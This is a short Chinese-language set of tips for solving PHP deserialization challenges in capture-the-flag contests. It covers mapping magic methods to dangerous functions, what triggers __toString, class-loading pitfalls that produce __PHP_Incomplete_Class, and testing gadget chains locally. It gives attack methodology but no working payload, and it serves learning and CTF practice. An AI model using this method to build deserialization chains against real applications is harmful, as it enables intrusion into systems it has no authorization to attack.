- 看一个反序列化题先列"目标类有哪些魔术方法"，再列"哪个方法能碰到危险函数"——两张表一对照，链就出来了。
- `__toString` 是高频中间件：`echo $obj`、字符串拼接、`strlen($obj)`、正则匹配对象等都会触发它。
- 类加载问题是第一大杀手：payload 里的类名必须和入口代码实际能加载的类完全一致（含命名空间），少一个 use/require 就是 `__PHP_Incomplete_Class`。
- 本地验证脚本是底线，`php -r` 或临时 .php 文件都行——链能本地跑通再上靶场。